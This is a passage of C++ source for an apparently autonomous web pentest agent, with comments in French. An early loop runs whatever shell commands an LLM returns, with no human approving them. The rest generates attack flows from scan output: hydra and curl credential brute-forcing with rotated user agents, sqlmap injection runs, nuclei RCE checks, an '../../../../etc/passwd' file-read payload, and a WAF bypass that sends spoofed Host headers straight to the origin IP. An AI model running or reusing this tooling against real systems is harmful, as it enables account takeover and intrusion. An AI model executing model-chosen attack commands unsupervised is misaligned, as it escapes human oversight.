            logerr("run_api_web_autopwn_mcp: MCP ERROR");
            return false;
        }

        std::string raw_response = out_mcp + "\n" + err_mcp;

        // ------------------------------------------------------------
        // 2.c) Extraire commande POSIX
        // ------------------------------------------------------------
        std::string next_cmd = extract_shell_command(raw_response);
        next_cmd = sanitize(next_cmd);

        if (next_cmd.empty()) {
            logerr("run_api_web_autopwn_mcp: MCP n’a rien renvoyé");
            return false;
        }

        // STOP
        if (next_cmd.find("DVGA_AUTOPWN_DONE") != std::string::npos) {
            std::cout << ansi::green
                      << "[API/AUTOPWN] --> FIN REELLE (DVGA_AUTOPWN_DONE)"
                      << ansi::reset << std::endl;
            return true;
        }

        // ------------------------------------------------------------
        // 2.d) Rejet des commandes répétées (boucles infinies)
        // ------------------------------------------------------------
        if (next_cmd == last_cmd1 || next_cmd == last_cmd2) {
            full_history += "[REJECT: repetition] " + next_cmd + "\n";
            continue;
        }

        // ------------------------------------------------------------
        // 2.e) Exécution de la commande shell
        // ------------------------------------------------------------
        std::string out, err;
        run_command_capture(next_cmd, out, err, 120000, false);

        std::string full = sanitize(out + "\n" + err);

        // Steps Log (lisible par un humain)
        if (steps) {
            steps << "===== STEP " << step << " =====\n"
                  << "CMD: " << next_cmd << "\n"
                  << "OUTPUT:\n" << full << "\n\n";
        }

        // MCP HISTORY LOG (débridé)
        if (hist) {
            hist << "\n[STEP " << step << "]\n"
                 << "CMD: " << next_cmd << "\n"
                 << "OUTPUT:\n" << full << "\n";
        }

        // Historique compact renvoyé au LLM
        full_history += "CMD=" + next_cmd + "\nOUT=\n" + full + "\n";

        last_cmd2 = last_cmd1;
        last_cmd1 = next_cmd;
    }

    loginfo("run_api_web_autopwn_mcp: MAX_STEPS atteint sans succès");
    return false;
}

// Wrapper de compatibilité si d'autres parties du code appellent encore l’ancien nom
static bool run_graphql_autopwn_mcp(const AgentOptions &opt,
                                    const fs::path &workdir)
{
    return run_api_web_autopwn_mcp(opt, workdir);
}

// -----------------------------------------------------------------------------
// Phase 3 : Orchestrateur post-exploit Web / HTTP (IA symbolique)
// -----------------------------------------------------------------------------
//
// Objectif : lire les artefacts existants (recon_*, alerts_*.json, confirm_*,
// bannières zgrab2, outputs nuclei/ZAP) et déclencher des flows post-exploit :
//
//   - FLOW_WEB_BRUTE_LOGIN
//   - FLOW_WEB_SQLI_AUTO
//   - FLOW_WEB_RCE_FINGERPRINTED
//   - FLOW_WEB_LFI_RFI_FILE_READ
//   - FLOW_EDGE_BYPASS
//
// On réutilise :
//   - ConfirmationCommand + execute_confirmation_plan()
//   - Fichiers existants : recon_httpx.txt, recon_waybackurls.txt,
//     recon_katana_urls_ok.txt, recon_dirb_common.txt, recon_wafw00f.txt,
//     recon_dig.txt, recon_resolved_ips.txt, recon_nuclei*.txt,
//     alerts_*.json / alerts_filtered.json.
//
// Pas de MCP ici : IA purement symbolique codée en dur.
//
// Sorties spécifiques :
//   - postexploit_plan_web.json  (plan structuré des flows)
//   - postexploit_results_web.json (résumé symbolique des résultats)
// -----------------------------------------------------------------------------

// Détection "login probable" dans une URL
static bool is_probable_login_url(const std::string &url) {
    std::string l = to_lower_copy(url);
    if (l.find("logout") != std::string::npos) return false; // éviter les faux positifs évidents
    return (l.find("login")  != std::string::npos) ||
           (l.find("signin") != std::string::npos) ||
           (l.find("sign-in")!= std::string::npos) ||
           (l.find("logon")  != std::string::npos) ||
           (l.find("wp-login") != std::string::npos) ||
           (l.find("/user/login") != std::string::npos) ||
           (l.find("/account/login") != std::string::npos);
}

// Extraction très tolérante d'une URL dans une ligne (dirb, wayback, etc.)
static std::string extract_url_from_line(const std::string &line) {
    auto pos = line.find("http://");
    if (pos == std::string::npos) pos = line.find("https://");
    if (pos == std::string::npos) return {};
    std::string url = line.substr(pos);
    // trim fin grossier
    while (!url.empty() && (url.back() == '\r' || url.back() == '\n' || std::isspace((unsigned char)url.back())))
        url.pop_back();
    return url;
}

// Fabrique une URL LFI à partir d'une URL de base + nom de paramètre
static std::string build_lfi_test_url(const std::string &url, const std::string &param_name) {
    auto qpos = url.find('?');
    const std::string payload = "../../../../etc/passwd";
    if (qpos == std::string::npos) {
        if (param_name.empty())
            return url + "?file=" + payload;
        return url + "?" + param_name + "=" + payload;
    }
    std::string base = url.substr(0, qpos);
    std::string query = url.substr(qpos + 1);

    std::vector<std::string> pairs;
    std::stringstream ss(query);
    std::string part;
    while (std::getline(ss, part, '&')) {
        pairs.push_back(part);
    }

    bool replaced = false;
    for (auto &p : pairs) {
        auto eq = p.find('=');
        if (eq == std::string::npos) continue;
        std::string key = p.substr(0, eq);
        std::string val = p.substr(eq + 1);
        if (!param_name.empty() && key == param_name) {
            p = key + "=" + payload;
            replaced = true;
        } else if (param_name.empty()) {
            // heuristique : param suspect (file/path/page/template)
            std::string lk = to_lower_copy(key);
            if (lk.find("file") != std::string::npos ||
                lk.find("path") != std::string::npos ||
                lk.find("page") != std::string::npos ||
                lk.find("template") != std::string::npos) {
                p = key + "=" + payload;
                replaced = true;
            }
        }
    }

    if (!replaced) {
        // rien ciblé, on ajoute un param "file="
        if (!param_name.empty())
            pairs.push_back(param_name + "=" + payload);
        else
            pairs.push_back("file=" + payload);
    }

    std::string new_query;
    for (size_t i = 0; i < pairs.size(); ++i) {
        if (i) new_query += "&";
        new_query += pairs[i];
    }
    return base + "?" + new_query;
}

// ------------------
// Filter ZAP alerts: dedupe + drop Informational
// ------------------
static fs::path filter_zap_alerts(const fs::path &workdir, bool /*recompute*/) {
    fs::path latest; // function `find_latest_alerts_json` doit exister dans ton code
    try {
        latest = find_latest_alerts_json(workdir);
    } catch(...) {
        latest.clear();
    }
    if (latest.empty() || !fs::exists(latest)) return fs::path();

    fs::path out = workdir / "alerts_filtered.json";
    try {
        std::ifstream ifs(latest);
        if (!ifs) return fs::path();
        std::ostringstream ss; ss << ifs.rdbuf();
        std::string txt = ss.str();
        json j = json::parse(txt, nullptr, false);
        if (j.is_discarded()) {
            // fallback: copy raw
            std::ofstream of(out); of << txt;
            return out;
        }

        json outj;
        outj["alerts"] = json::array();
        std::set<std::string> seen;
        auto accept_alert = [&](const json &a)->bool {
            std::string name = a.value("name", "");
            std::string uri  = a.value("uri", a.value("url", ""));
            std::string plugin = a.value("pluginId", "");
            std::string risk = a.value("risk", a.value("riskdesc", ""));
            std::string key = name + "|" + uri + "|" + plugin;
            if (name.empty()) return false;
            if (seen.find(key) != seen.end()) return false;
            std::string lr = to_lower_copy(risk);
            if (lr.find("informational") != std::string::npos) return false;
            seen.insert(key);
            return true;
        };

        if (j.is_object() && j.contains("alerts") && j["alerts"].is_array()) {
            for (auto &a : j["alerts"]) if (accept_alert(a)) outj["alerts"].push_back(a);
        } else if (j.is_array()) {
            for (auto &a : j) if (accept_alert(a)) outj["alerts"].push_back(a);
        } else {
            // unknown format: copy raw
            std::ofstream of(out); of << txt;
            return out;
        }

        std::ofstream of(out);
        of << std::setw(2) << outj;
        return out;
    } catch(...) {
        try {
            // fallback copy
            std::ifstream ifs(latest, std::ios::binary);
            std::ofstream of(out, std::ios::binary);
            of << ifs.rdbuf();
            return out;
        } catch(...) {
            return fs::path();
        }
    }
}

// Collecte symbolique des surfaces post-exploit Web à partir des artefacts
static nlohmann::json collect_web_postexploit_surfaces(const std::string &baseurl,
                                                       const fs::path &workdir) {
    using json = nlohmann::json;
    json surfaces;
    surfaces["login_endpoints"] = json::array();
    surfaces["sqli_candidates"] = json::array();
    surfaces["rce_candidates"]  = json::array();
    surfaces["lfi_candidates"]  = json::array();
    surfaces["edge_candidates"] = json::array();

    const std::string host = extract_hostname(baseurl);

    std::unordered_set<std::string> seen_login;
    std::unordered_set<std::string> seen_sqli;
    std::unordered_set<std::string> seen_lfi;
    std::unordered_set<std::string> seen_rce;

    auto add_login = [&](const std::string &url, const std::string &source, const std::string &detail) {
        if (url.empty()) return;
        // on reste sur le même host si possible
        std::string h2 = extract_hostname(url);
        if (!host.empty() && !h2.empty() && h2 != host) return;
        if (seen_login.insert(url).second) {
            json o;
            o["url"] = url;
            o["source"] = source;
            if (!detail.empty()) o["detail"] = detail;
            surfaces["login_endpoints"].push_back(o);
        }
    };

    auto add_sqli = [&](const std::string &url, const std::string &param,
                        const std::string &source, const std::string &detail) {
        if (url.empty()) return;
        std::string key = url + "|" + param;
        if (seen_sqli.insert(key).second) {
            json o;
            o["url"] = url;
            if (!param.empty()) o["param"] = param;
            o["source"] = source;
            if (!detail.empty()) o["detail"] = detail;
            surfaces["sqli_candidates"].push_back(o);
        }
    };

    auto add_lfi = [&](const std::string &url, const std::string &param,
                       const std::string &source, const std::string &detail) {
        if (url.empty()) return;
        std::string key = url + "|" + param;
        if (seen_lfi.insert(key).second) {
            json o;
            o["url"] = url;
            if (!param.empty()) o["param"] = param;
            o["source"] = source;
            if (!detail.empty()) o["detail"] = detail;
            surfaces["lfi_candidates"].push_back(o);
        }
    };

    auto add_rce = [&](const std::string &url, const std::string &source,
                       const std::string &detail, const std::string &template_id = "") {
        if (url.empty()) return;
        std::string key = url + "|" + template_id;
        if (seen_rce.insert(key).second) {
            json o;
            o["url"] = url;
            o["source"] = source;
            if (!detail.empty()) o["detail"] = detail;
            if (!template_id.empty()) o["template_id"] = template_id;
            surfaces["rce_candidates"].push_back(o);
        }
    };

    // ---------------------- ZAP alerts (alerts_filtered.json) -----------------
    fs::path alerts_filtered = workdir / "alerts_filtered.json";
    if (!fs::exists(alerts_filtered)) {
        // On tente de générer alerts_filtered.json si non présent
        fs::path tmp = filter_zap_alerts(workdir, false);
        if (!tmp.empty() && fs::exists(tmp)) {
            alerts_filtered = tmp;
        }
    }

    if (fs::exists(alerts_filtered)) {
        try {
            std::string txt = readFile(alerts_filtered.string());
            if (!txt.empty()) {
                json j = json::parse(txt, nullptr, false);
                if (!j.is_discarded() && j.contains("alerts") && j["alerts"].is_array()) {
                    for (const auto &a : j["alerts"]) {
                        std::string name   = a.value("name", "");
                        std::string url    = a.value("url", a.value("uri", ""));
                        std::string param  = a.value("param", "");
                        std::string plugin = a.value("pluginId", "");
                        std::string risk   = a.value("risk", a.value("riskdesc", ""));

                        std::string lname = to_lower_copy(name);

                        // Login forms / auth
                        if (icontains(name, "login") ||
                            icontains(name, "authentication") ||
                            is_probable_login_url(url) ||
                            icontains(param, "user") ||
                            icontains(param, "login")) {
                            add_login(url, "zap_alert", "alert=" + name + " param=" + param);
                        }

                        // SQLi
                        if (lname.find("sql injection") != std::string::npos ||
                            lname.find("sqli") != std::string::npos) {
                            add_sqli(url, param, "zap_alert", "alert=" + name + " risk=" + risk);
                        }

                        // LFI / Path traversal
                        if (lname.find("path traversal") != std::string::npos ||
                            lname.find("directory traversal") != std::string::npos ||
                            lname.find("local file inclusion") != std::string::npos ||
                            lname.find("file inclusion") != std::string::npos) {
                            add_lfi(url, param, "zap_alert", "alert=" + name + " risk=" + risk);
                        }

                        // RCE / Command injection
                        if (lname.find("remote code execution") != std::string::npos ||
                            lname.find("command injection") != std::string::npos ||
                            lname.find("remote command") != std::string::npos) {
                            add_rce(url, "zap_alert", "alert=" + name + " risk=" + risk);
                        }
                    }
                }
            }
        } catch (...) {
            logerr("[AI] Post-exploit Web: echec parse alerts_filtered.json");
        }
    }

    // ---------------------- Nuclei (recon_nuclei*.txt) ------------------------
    fs::path nuclei_file = find_newest_file_containing(workdir, "recon_nuclei");
    if (!nuclei_file.empty() && fs::exists(nuclei_file)) {
        try {
            std::ifstream in(nuclei_file);
            std::string line;
            while (std::getline(in, line)) {
                if (line.empty()) continue;
                std::string l = to_lower_copy(line);

                // Format typique : "https://target/path [template-id] [sev] ..."
                std::string url = extract_url_from_line(line);
                if (url.empty()) {
                    // fallback très simple : premier token sans espace
                    std::stringstream ss(line);
                    ss >> url;
                }

                // On récupère l'identifiant de template (entre [] si possible)
                std::string template_id;
                auto lb = line.find('[');
                auto rb = line.find(']');
                if (lb != std::string::npos && rb != std::string::npos && rb > lb + 1) {
                    template_id = line.substr(lb + 1, rb - lb - 1);
                }

                // SQLi
                if (l.find("sqli") != std::string::npos ||
                    l.find("sql injection") != std::string::npos) {
                    add_sqli(url, "", "nuclei", "match=" + line);
                }

                // LFI / file read / traversal
                if (l.find("lfi") != std::string::npos ||
                    l.find("local file inclusion") != std::string::npos ||
                    l.find("path traversal") != std::string::npos ||
                    l.find("directory traversal") != std::string::npos ||
                    l.find("file-read") != std::string::npos) {
                    add_lfi(url, "", "nuclei", "match=" + line);
                }

                // RCE / command injection / deserialization
                if (l.find(" rce") != std::string::npos ||
                    l.find("remote code execution") != std::string::npos ||
                    l.find("command injection") != std::string::npos ||
                    l.find("code-exec") != std::string::npos ||
                    l.find("deserialization") != std::string::npos) {
                    add_rce(url, "nuclei", "match=" + line, template_id);
                }

                // Login endpoints déduits via path
                if (is_probable_login_url(url)) {
                    add_login(url, "nuclei_paths", "match=" + line);
                }
            }
        } catch (...) {
            logerr("[AI] Post-exploit Web: echec lecture recon_nuclei");
        }
    }

    // ---------------------- URL surface (wayback / katana / dirb) -------------
    auto add_login_from_file = [&](const fs::path &file, const std::string &source) {
        if (!fs::exists(file)) return;
        try {
            std::ifstream in(file);
            std::string line;
            while (std::getline(in, line)) {
                std::string url = extract_url_from_line(line);
                if (url.empty()) continue;
                if (is_probable_login_url(url)) {
                    add_login(url, source, line);
                }
            }
        } catch (...) {
            logerr("[AI] Post-exploit Web: echec lecture " + file.string());
        }
    };

    add_login_from_file(workdir / "recon_waybackurls.txt", "waybackurls");
    add_login_from_file(workdir / "recon_katana_urls_ok.txt", "katana");
    add_login_from_file(workdir / "recon_dirb_common.txt", "dirb_common");

    // ---------------------- Edge bypass : WAF + IP d'origin -------------------
    fs::path waf_file = workdir / "recon_wafw00f.txt";
    fs::path dig_file = workdir / "recon_dig.txt";
    fs::path ips_file = workdir / "recon_resolved_ips.txt";

    bool waf_detected = false;
    if (fs::exists(waf_file)) {
        try {
            std::string txt = readFile(waf_file.string());
            std::string l = to_lower_copy(txt);
            if (l.find("is behind") != std::string::npos ||
                l.find("web application firewall") != std::string::npos ||
                l.find("waf") != std::string::npos) {
                waf_detected = true;
            }
        } catch (...) {
            logerr("[AI] Post-exploit Web: echec lecture recon_wafw00f.txt");
        }
    }

    if (waf_detected) {
        std::string ip_candidate;

        auto extract_ip_from_line = [](const std::string &line) -> std::string {
            static const std::regex ip_re(R"(((\d{1,3}\.){3}\d{1,3}))");
            std::smatch m;
            if (std::regex_search(line, m, ip_re)) {
                return m[1].str();
            }
            return {};
        };

        auto search_ip_file = [&](const fs::path &file) {
            if (!fs::exists(file) || !ip_candidate.empty()) return;
            try {
                std::ifstream in(file);
                std::string line;
                while (std::getline(in, line)) {
                    if (!host.empty() && line.find(host) == std::string::npos) continue;
                    std::string ip = extract_ip_from_line(line);
                    if (!ip.empty()) {
                        ip_candidate = ip;
                        break;
                    }
                }
            } catch (...) {
                logerr("[AI] Post-exploit Web: echec lecture " + file.string());
            }
        };

        search_ip_file(ips_file);
        search_ip_file(dig_file);

        if (!ip_candidate.empty()) {
            nlohmann::json e;
            e["host"] = host;
            e["ip"]   = ip_candidate;
            e["source"] = "wafw00f+dns";
            surfaces["edge_candidates"].push_back(e);
        }
    }

    return surfaces;
}

// Construction du plan de flows post-exploit Web (ConfirmationCommand + JSON)
static void build_web_postexploit_plan(const std::string &baseurl,
                                       const fs::path &workdir,
                                       const nlohmann::json &surfaces,
                                       std::vector<ConfirmationCommand> &plan,
                                       nlohmann::json &plan_json) {
    using json = nlohmann::json;
    plan.clear();
    plan_json = json::object();
    plan_json["baseurl"]      = baseurl;
    plan_json["generated_at"] = current_datetime_string();
    plan_json["flows"]        = json::array();

    const std::string host = extract_hostname(baseurl);

    int brute_idx = 0;
    int sqli_idx  = 0;
    int rce_idx   = 0;
    int lfi_idx   = 0;
    int edge_idx  = 0;

    auto add_flow = [&](const std::string &id,
                        const std::string &category,
                        const std::string &tool,
                        const std::string &target,
                        const std::string &description,
                        const std::string &command,
                        const fs::path &outfile,
                        const json &evidence) {
        ConfirmationCommand cmd;
        cmd.id          = id;
        cmd.description = description;
        cmd.command     = command;
        cmd.outfile     = outfile.string();
        plan.push_back(cmd);

        json jf;
        jf["id"]        = id;
        jf["category"]  = category;
        jf["tool"]      = tool;
        jf["target"]    = target;
        jf["description"] = description;
        jf["command"]   = command;
        jf["outfile"]   = outfile.filename().string();
        jf["evidence"]  = evidence;
        plan_json["flows"].push_back(jf);
    };

    // ---------------- FLOW_WEB_BRUTE_LOGIN (AVANCE) ----------------
    if (surfaces.contains("login_endpoints") && surfaces["login_endpoints"].is_array()) {
        nlohmann::json vault = load_creds_vault(workdir);
        const std::string host = extract_hostname(baseurl);

        // Wordlists contextuelles
        auto pwds = build_contextual_passwords(host, surfaces, workdir);
        auto usrs = build_contextual_usernames(host, vault);

        // On écrit des wordlists locales pour hydra
        fs::path users_file = workdir / "post_wordlist_users.txt";
        fs::path passw_file = workdir / "post_wordlist_passwords.txt";
        try {
            std::ofstream uo(users_file);
            for (auto &u : usrs) uo << u << "\n";
            std::ofstream po(passw_file);
            for (auto &p : pwds) po << p << "\n";
            loginfo("[BRUTE] wordlists users/passwords ecrites (" + users_file.filename().string() +
                    ", " + passw_file.filename().string() + ")");
        } catch (...) {
            logerr("[BRUTE] echec ecriture wordlists");
        }

        // UA pool (utilise par le fallback curl)
        std::vector<std::string> user_agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0"
        };

        // Fail/Success patterns pour hydra
        std::string hydraF = hydra_failure_regex_generic();
        std::string hydraS = hydra_success_regex_generic();

        for (const auto &le : surfaces["login_endpoints"]) {
            std::string url = le.value("url", "");
            if (url.empty()) continue;

            // Décomposer URL
            UrlParts parts = parse_url(url); // supposé exister (tu as déjà des utilitaires URL)
            std::string scheme = parts.scheme;
            std::string hostp  = parts.host;
            int port           = parts.port ? parts.port : ((scheme=="https")?443:80);
            std::string path   = parts.path.empty()? "/" : parts.path;

            // 1) Stratégie HYDRA ciblée
            //    - BASIC/DIGEST -> http-get (ou http-head)
            //    - Form login générique -> http-post-form
            bool is_https = (to_lower_copy(scheme) == "https");
            std::string base_hydra = "hydra -I -f -t 4 -w 15 -L \"" + shell_escape_double_quotes(users_file.string()) +
                                    "\" -P \"" + shell_escape_double_quotes(passw_file.string()) + "\" -s " +
                                    std::to_string(port) + (is_https ? " -S" : "") + " -vV ";

            std::string module;
            std::string module_opts;

            if (target_has_http_basic_or_digest(workdir, host)) {
                // BASIC/DIGEST
                module = "http-get";
                module_opts = "\"/" + shell_escape_double_quotes(path) + "\"";
            } else if (is_wp_login(url)) {
                // WordPress : champs connus (pas de CSRF)
                module = "http-post-form";
                // F/S patterns plus adaptés WP (et on garde nos génériques aussi)
                std::string F = "F=erreur|incorrect|echec|invalid|Erreur|mot de passe|identifiant";
                std::string S = "S=wp-admin|dashboard|Set-Cookie|Location";
                module_opts = "\"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:" + F + "|" + hydraF + ":" + S + "|" + hydraS + "\"";
            } else {
                // Générique : on tente les champs typiques
                module = "http-post-form";
                // On essaie plusieurs combos de champs; hydra permet un seul gabarit par commande.
                // Donc on va empiler 3 variantes (username/password, user/pass, email/password)
                std::vector<std::string> forms = {
                    "/login:username=^USER^&password=^PASS^:" + hydraF + ":" + hydraS,
                    (path + ":username=^USER^&password=^PASS^:" + hydraF + ":" + hydraS),
                    (path + ":user=^USER^&pass=^PASS^:"       + hydraF + ":" + hydraS),
                    (path + ":email=^USER^&password=^PASS^:"  + hydraF + ":" + hydraS),
                    (path + ":login=^USER^&pwd=^PASS^:"       + hydraF + ":" + hydraS)
                };

                // On créera 3 flows hydra max pour limiter la charge
                int take = 0;
                for (auto &frm : forms) {
                    if (take++ >= 3) break;
                    std::string cmd = base_hydra + hostp + " " + module + " \"" + shell_escape_double_quotes(frm) + "\"";
                    fs::path outfile = workdir / ("postexploit_web_bruteforce_" + std::to_string(brute_idx) + "_hydra.txt");
                    std::string id   = "FLOW_WEB_BRUTE_LOGIN_" + std::to_string(brute_idx++) + "_HYDRA";
                    std::string desc = "Post-exploit Web: hydra POST form " + url + " frm=" + frm;

                    nlohmann::json ev = le;
                    ev["method"] = "hydra";
                    ev["form"] = frm;

                    add_flow(id, "WEB_BRUTE_LOGIN", "hydra", url, desc, cmd, outfile, ev);
                }

                // Et on continue la boucle pour le fallback curl ; on saute l'hydra single ci-dessous
                // => continue vers fallback plus bas
            }

            if (module == "http-get" || is_wp_login(url)) {
                // Un seul flow hydra pour BASIC ou WP (déjà construit module/module_opts)
                std::string cmd = base_hydra + hostp + " " + module + " " + module_opts;
                fs::path outfile = workdir / ("postexploit_web_bruteforce_" + std::to_string(brute_idx) + "_hydra.txt");
                std::string id   = "FLOW_WEB_BRUTE_LOGIN_" + std::to_string(brute_idx++) + "_HYDRA";
                std::string desc = "Post-exploit Web: hydra " + module + " sur " + url;

                nlohmann::json ev = le;
                ev["method"] = "hydra";
                ev["module"] = module;

                add_flow(id, "WEB_BRUTE_LOGIN", "hydra", url, desc, cmd, outfile, ev);
            }

            // 2) Fallback CURL combinatoire (top-N * top-M) avec throttling et heuristique cookies
            // On limite pour ne pas agresser : N=20 users, M=25 pwds (500 tentatives max)
            std::vector<std::string> us_top = usrs; if (us_top.size() > 20) us_top.resize(20);
            std::vector<std::string> pw_top = pwds; if (pw_top.size() > 25) pw_top.resize(25);

            // On écrit les petites listes pour la boucle bash
            fs::path mini_users = workdir / ("post_brute_users_top.txt");
            fs::path mini_pwds  = workdir / ("post_brute_passwords_top.txt");
            try {
                std::ofstream uo(mini_users); for (auto &u : us_top) uo << u << "\n";
                std::ofstream po(mini_pwds);  for (auto &p : pw_top)  po << p << "\n";
            } catch (...) {}

            // UA random picking (via bash)
            // Test success heuristique: Set-Cookie (PHPSESSID|JSESSIONID|session|jwt),
            // Location avec /admin|/dashboard|/wp-admin, absence d'"invalid|incorrect|captcha"
            std::string ua1 = shell_escape_double_quotes(user_agents[0]);
            std::string ua2 = shell_escape_double_quotes(user_agents[1]);
            std::string ua3 = shell_escape_double_quotes(user_agents[2]);
            std::string ua4 = shell_escape_double_quotes(user_agents[3]);

            std::string safe_url = shell_escape_double_quotes(url);

            // On tente un POST générique username/password + variantes user/pass + login/pwd
            // On s'arrête à la première réussite (# SUCCESS: true + FOUND ...).
            std::string curl_loop =
                "bash -lc 'ok=0; "
                "UAS=(" + ua1 + " " + ua2 + " " + ua3 + " " + ua4 + "); "
                "while read U; do while read P; do "
                "UA=${UAS[$RANDOM%${#UAS[@]}]}; "
                "for FORM in "
                "\"username=$U&password=$P\" "
                "\"user=$U&pass=$P\" "
                "\"login=$U&pwd=$P\" "
                "\"email=$U&password=$P\" "
                "\"log=$U&pwd=$P&wp-submit=Log+In\" "
                "; do "
                "R=$(curl -sk -X POST \"" + safe_url + "\" -A \"$UA\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"$FORM\" -D - ); "
                "if echo \"$R\" | grep -Eiq \"Set-Cookie:.*(PHPSESSID|JSESSIONID|session|jwt)\" "
                    "|| echo \"$R\" | grep -Eiq \"Location: .*(/admin|/dashboard|/wp-admin)\" "
                    "&& ! echo \"$R\" | grep -Eiq \"(invalid|incorrect|captcha|unauthorized|forbidden|denied)\"; then "
                    "echo \"# SUCCESS: true\"; echo \"FOUND username=$U password=$P\"; ok=1; break; "
                "fi; "
                "sleep 0.5; "
                "done; "
                "if [ $ok -eq 1 ]; then break; fi; "
                "done < \"" + shell_escape_double_quotes(mini_pwds.string()) + "\"; "
                "if [ $ok -eq 1 ]; then break; fi; "
                "done < \"" + shell_escape_double_quotes(mini_users.string()) + "\"; "
                "if [ $ok -eq 0 ]; then echo \"# SUCCESS: false\"; fi'";

            fs::path outfile2 = workdir / ("postexploit_web_bruteforce_" + std::to_string(brute_idx) + "_curl.txt");
            std::string id2   = "FLOW_WEB_BRUTE_LOGIN_" + std::to_string(brute_idx++) + "_CURL";
            std::string desc2 = "Post-exploit Web: fallback curl brute loops (throttled) " + url;

            nlohmann::json ev2 = le;
            ev2["method"] = "curl-loops";

            add_flow(id2, "WEB_BRUTE_LOGIN", "curl", url, desc2, curl_loop, outfile2, ev2);
        }
    }

    // ---------------- FLOW_WEB_SQLI_AUTO -------------------
    if (surfaces.contains("sqli_candidates") && surfaces["sqli_candidates"].is_array()) {
        for (const auto &sc : surfaces["sqli_candidates"]) {
            std::string url   = sc.value("url", "");
            if (url.empty()) continue;
            std::string param = sc.value("param", "");
            std::string safe  = shell_escape_double_quotes(url);

            // sqlmap auto sur l'URL (GET) -> on le laisse analyser tout seul
            std::string cmd = "sqlmap -u \"" + safe +
                              "\" --batch --random-agent --level 2 --risk 2 "
                              "--disable-coloring --smart -o";

            fs::path outfile = workdir / ("postexploit_web_sqli_" + std::to_string(sqli_idx) + ".txt");
            std::string id   = "FLOW_WEB_SQLI_AUTO_" + std::to_string(sqli_idx++);

            std::string desc = "Post-exploit Web: sqlmap auto sur " + url;
            if (!param.empty()) desc += " (param=" + param + ")";

            add_flow(id,
                     "WEB_SQLI_AUTO",
                     "sqlmap",
                     url,
                     desc,
                     cmd,
                     outfile,
                     sc);
        }
    }

    // ---------------- FLOW_WEB_RCE_FINGERPRINTED ----------
    if (surfaces.contains("rce_candidates") && surfaces["rce_candidates"].is_array()) {
        for (const auto &rc : surfaces["rce_candidates"]) {
            std::string url   = rc.value("url", "");
            if (url.empty()) continue;
            std::string templ = rc.value("template_id", "");
            std::string safe  = shell_escape_double_quotes(url);

            // Stratégie minimale : relancer nuclei sur l'ID de template RCE si présent,
            // sinon tags "rce"
            std::string cmd;
            if (!templ.empty()) {
                cmd = "nuclei -u \"" + safe + "\" -id " + templ + " -nc -silent";
            } else {
                cmd = "nuclei -u \"" + safe + "\" -tags rce -nc -silent";
            }

            fs::path outfile = workdir / ("postexploit_web_rce_" + std::to_string(rce_idx) + ".txt");
            std::string id   = "FLOW_WEB_RCE_FINGERPRINTED_" + std::to_string(rce_idx++);

            std::string desc = "Post-exploit Web: revalidation RCE nuclei sur " + url;
            if (!templ.empty()) desc += " (template=" + templ + ")";

            add_flow(id,
                     "WEB_RCE_FINGERPRINTED",
                     "nuclei",
                     url,
                     desc,
                     cmd,
                     outfile,
                     rc);
        }
    }

    // ---------------- FLOW_WEB_LFI_RFI_FILE_READ ----------
    if (surfaces.contains("lfi_candidates") && surfaces["lfi_candidates"].is_array()) {
        for (const auto &lc : surfaces["lfi_candidates"]) {
            std::string url   = lc.value("url", "");
            if (url.empty()) continue;
            std::string param = lc.value("param", "");

            std::string test_url = build_lfi_test_url(url, param);
            std::string safe     = shell_escape_double_quotes(test_url);

            std::string cmd = "curl -sk \"" + safe + "\"";

            fs::path outfile = workdir / ("postexploit_web_lfi_" + std::to_string(lfi_idx) + ".txt");
            std::string id   = "FLOW_WEB_LFI_RFI_FILE_READ_" + std::to_string(lfi_idx++);

            std::string desc = "Post-exploit Web: lecture LFI (etc/passwd) sur " + test_url;

            add_flow(id,
                     "WEB_LFI_RFI_FILE_READ",
                     "curl",
                     test_url,
                     desc,
                     cmd,
                     outfile,
                     lc);
        }
    }

    // ---------------- FLOW_EDGE_BYPASS ---------------------
    if (surfaces.contains("edge_candidates") && surfaces["edge_candidates"].is_array()) {
        for (const auto &ec : surfaces["edge_candidates"]) {
            std::string ip   = ec.value("ip", "");
            std::string hosth = ec.value("host", host);
            if (ip.empty() || hosth.empty()) continue;

            std::string safe_ip   = shell_escape_double_quotes(ip);
            std::string safe_host = shell_escape_double_quotes(hosth);

            std::string cmd =
                "curl -sk -D - \"http://" + safe_ip +
                "/\" -H \"Host: " + safe_host +
                "\" -H \"X-Forwarded-Host: " + safe_host +
                "\" -H \"X-Original-Host: " + safe_host + "\"";

            fs::path outfile = workdir / ("postexploit_web_edge_bypass_" + std::to_string(edge_idx) + ".txt");
            std::string id   = "FLOW_EDGE_BYPASS_" + std::to_string(edge_idx++);

            std::string desc = "Post-exploit Web: tentative de bypass WAF via IP d'origin " + ip +
                               " et Host " + hosth;

            add_flow(id,
                     "WEB_EDGE_BYPASS",
                     "curl",
                     "http://" + ip + "/",
                     desc,
                     cmd,
                     outfile,
                     ec);
        }
    }
}

// Analyse symbolique des fichiers produits par les flows post-exploit Web
static void analyse_postexploit_results_web(const fs::path &workdir,
                                            const std::vector<ConfirmationCommand> &plan,
                                            const std::vector<fs::path> &produced_files) {
    using json = nlohmann::json;
    json results;
    results["generated_at"] = current_datetime_string();
    results["flows"]        = json::array();

    // Map outfile -> path pour lookup rapide
    std::unordered_map<std::string, fs::path> by_name;
    for (const auto &p : produced_files) {
        by_name[p.filename().string()] = p;
    }

    nlohmann::json vault = load_creds_vault(workdir);

    for (const auto &cmd : plan) {
        json jf;
        jf["id"]          = cmd.id;
        jf["description"] = cmd.description;
        jf["command"]     = cmd.command;
        jf["outfile"]     = cmd.outfile;

        auto it = by_name.find(fs::path(cmd.outfile).filename().string());
        bool success  = false;
        bool has_loot = false;

        std::string found_user, found_pass;
        std::string target_url;

        // Déduire l'URL cible depuis la description (fallback)
        {
            // " ... sur https://host/xxx" ou " ... " + url"
            std::string d = cmd.description;
            auto pos = d.find("http");
            if (pos != std::string::npos) {
                target_url = d.substr(pos);
